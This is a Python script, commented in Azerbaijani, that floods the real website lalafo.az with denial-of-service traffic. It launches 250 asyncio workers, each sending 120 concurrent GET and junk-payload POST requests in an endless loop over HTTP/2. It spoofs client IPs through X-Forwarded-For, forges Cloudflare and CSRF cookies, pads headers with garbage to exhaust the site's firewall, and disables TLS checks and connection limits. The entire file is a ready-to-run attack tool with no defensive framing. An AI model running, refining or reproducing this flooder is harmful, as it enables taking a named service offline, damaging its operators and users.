import asyncio
import httpx
import random
import string
import ssl

# --- EXTREME TARGET ---
TARGET_URL = "https://lalafo.az"
WORKERS = 250         # Railway limitlərini sona qədər zorlayırıq
BATCH_SIZE = 120      # Hər worker eyni anda 120 "öldürücü" stream yaradır

def gen_garbage(n=15):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

async def doomsday_worker(worker_id, client):
    # Modern brauzerlərin ən son fingerprint-lərini təqlid edirik
    u_agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
    ]
    
    while True:
        try:
            headers = {
                "User-Agent": random.choice(u_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-store, no-cache, max-age=0",
                "TE": "trailers",
                "X-Requested-With": "XMLHttpRequest",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                # Bu başlıqlar WAF-ı içəridən yormaq üçün "junk" məlumatlarla doldurulur
                "X-Custom-Fuzz": gen_garbage(500), 
                "Cookie": f"cf_clearance={gen_garbage(40)}; csrftoken={gen_garbage(32)}"
            }

            # Dinamik URL + Path Fuzzing
            paths = ["/api/v3/feed", "/search", "/ru/azerbaijan", "/api/v2/items"]
            url = f"{TARGET_URL}{random.choice(paths)}?{gen_garbage(5)}={gen_garbage(20)}&debug=true"

            # HTTP/2 Rapid Reset & Flood
            tasks = []
            for _ in range(BATCH_SIZE):
                # Həm GET, həm də ağır Payload-lu POST göndəririk
                if _ % 2 == 0:
                    tasks.append(client.get(url, headers=headers))
                else:
                    payload = {gen_garbage(5): gen_garbage(200) for _ in range(10)}
                    tasks.append(client.post(url, headers=headers, json=payload))

            # Bütün asinxron sorğuları eyni anda serverin üzərinə buraxırıq
            await asyncio.gather(*tasks, return_exceptions=True)

        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"💀 DOOMSDAY MODE ACTIVATED: {TARGET_URL}")
    print(f"[*] Power Level: {WORKERS} Workers | {BATCH_SIZE} Batch Size")
    
    # TCP səviyyəsində bağlantı limitlərini ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True,          # HTTP/2 hökməndir (Bypass üçün)
        verify=False,        # SSL yoxlamasını keç (Sürət üçün)
        limits=limits,
        timeout=None         # Server cavab verməsə də bağlantını kəsmə
    ) as client:
        
        # Worker-ləri birbaşa işə salırıq
        workers = [doomsday_worker(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
